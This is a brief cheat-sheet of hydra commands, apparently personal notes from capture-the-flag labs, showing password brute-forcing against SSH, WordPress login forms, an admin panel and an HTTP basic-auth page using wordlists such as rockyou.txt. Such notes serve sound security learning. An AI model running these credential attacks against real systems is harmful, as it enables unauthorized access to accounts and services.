## Example
```bash
hydra -l jan -P /home/kali/rockyou.txt ssh://10.10.170.85 -t 4

hydra -L fsocity.dic -p test 10.10.113.106 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.113.106%2Fwp-admin%2F&testcookie=1:F=Invalid username"

hydra -l Elliot -P fsocity.dic mrrobot.thm http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.113.106%2Fwp-admin%2F&testcookie=1:S=302"

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.30.84 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=password invalid"

#the basic website login form(the one with pop up is http-head)
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.218.238 http-head /protected
```